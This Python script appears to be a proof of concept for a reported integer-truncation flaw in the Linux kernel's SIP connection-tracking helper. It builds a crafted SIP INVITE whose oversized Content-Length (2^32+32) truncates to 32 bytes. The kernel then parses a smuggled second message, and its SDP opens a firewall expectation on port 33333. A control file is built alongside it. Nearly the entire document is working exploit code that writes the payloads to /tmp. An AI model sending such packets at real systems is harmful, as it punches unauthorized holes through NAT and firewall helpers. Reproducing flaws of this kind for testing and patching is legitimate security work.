#!/usr/bin/env python3
"""Craft the CVE-2026-23457 trigger/control pair for nf_conntrack_sip sip_help_tcp().

Trigger:  first SIP message carries Content-Length: 4294967328 (2^32 + 32).
          simple_strtoul() (unsigned long, 64-bit kernel) returns it, but the
          result is stored in `unsigned int clen` -> truncates to 32. The
          message boundary is computed at header + 32 bytes, the trailer is
          parsed as a second SIP message, and its SDP (m=audio 33333) creates
          a conntrack expectation for port 33333 -- the observable.
Control:  identical bytes but Content-Length: 999999 (fits in u32, no
          truncation). msglen > datalen -> helper returns NF_ACCEPT and the
          trailer is never parsed -> no expectation.

Both ride one TCP segment on an established dport-5060 flow.
"""

TRAILER = (
    "INVITE sip:probe@t SIP/2.0\r\n"
    "Via: SIP/2.0/TCP 192.168.1.150:5060;branch=z9hG4bKcvetrunc\r\n"
    "From: <sip:a@t>;tag=9\r\n"
    "To: <sip:b@t>\r\n"
    "Call-ID: cvetrunc1@t\r\n"
    "CSeq: 2 INVITE\r\n"
    "Contact: <sip:a@192.168.1.150:5060>\r\n"
    "Content-Type: application/sdp\r\n"
    "Content-Length: 61\r\n"
    "\r\n"
    "v=0\r\n"
    "o=a 1 1 IN IP4 192.168.1.150\r\n"
    "s=p\r\n"
    "c=IN IP4 192.168.1.150\r\n"
    "t=0 0\r\n"
    "m=audio 33333 RTP/AVP 0\r\n"
)

BODY32 = "v=0\r\no=a 1 1 IN IP4 192.168.1.\r\n"  # exactly 32 bytes, no m= line


def build(clen_value):
    sdp = TRAILER.split("\r\n\r\n", 1)[1]
    trailer = TRAILER.replace(
        "Content-Length: 61\r\n",
        f"Content-Length: {len(sdp.encode())}\r\n")
    first = (
        "INVITE sip:probe@t SIP/2.0\r\n"
        "Via: SIP/2.0/TCP 192.168.1.150:5060;branch=z9hG4bKmsg1\r\n"
        "From: <sip:a@t>;tag=8\r\n"
        "To: <sip:b@t>\r\n"
        "Call-ID: cvetrunc1@t\r\n"
        "CSeq: 1 INVITE\r\n"
        "Contact: <sip:a@192.168.1.150:5060>\r\n"
        "Content-Type: application/sdp\r\n"
        f"Content-Length: {clen_value}\r\n"
        "\r\n"
    )
    return (first + BODY32 + trailer).encode()


if __name__ == "__main__":
    trig = build(4294967328)   # 2^32 + 32 -> truncates to 32
    ctrl = build(999999)        # fits u32 -> boundary past the segment end
    open("/tmp/sip_trig.bin", "wb").write(trig)
    open("/tmp/sip_ctrl.bin", "wb").write(ctrl)
    print("trigger:", len(trig), "bytes")
    print("control:", len(ctrl), "bytes")
